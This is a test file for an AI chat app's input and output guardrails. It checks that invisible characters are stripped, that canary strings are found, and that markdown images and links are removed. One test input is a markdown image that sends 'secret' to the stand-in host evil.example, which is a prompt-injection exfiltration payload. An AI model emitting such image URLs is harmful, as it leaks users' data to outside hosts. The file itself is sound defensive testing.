import { describe, expect, it } from "vitest";
import { MAX_QUESTION_CHARS, checkInput } from "../../src/guardrails/input.ts";
import { findCanaries, sanitizeOutput } from "../../src/guardrails/output.ts";

describe("checkInput", () => {
  it("normalises, strips invisible characters and trims", () => {
    expect(checkInput("  How many\u200B customers\u{E0041}?  ")).toEqual({
      ok: true,
      question: "How many customers?",
    });
    expect(checkInput("ｆｕｌｌwidth")).toEqual({ ok: true, question: "fullwidth" });
  });

  it("rejects empty and oversized questions", () => {
    expect(checkInput(" \u200B ").ok).toBe(false);
    expect(checkInput("a".repeat(MAX_QUESTION_CHARS)).ok).toBe(true);
    expect(checkInput("a".repeat(MAX_QUESTION_CHARS + 1)).ok).toBe(false);
  });
});

describe("sanitizeOutput", () => {
  it("removes markdown images and turns links into plain text", () => {
    expect(
      sanitizeOutput(
        "Total 5 ![x](https://evil.example/?d=secret) see [docs](https://evil.example)",
      ),
    ).toBe("Total 5  see docs");
  });

  it("strips invisible characters but keeps HTML as text", () => {
    expect(sanitizeOutput("a\u200Bb <img src=x>")).toBe("ab <img src=x>");
  });
});

describe("findCanaries", () => {
  it("finds canary strings case-insensitively", () => {
    expect(findCanaries("leaked CANARY-123 here", ["canary-123", "other", ""])).toEqual([
      "canary-123",
    ]);
  });
});
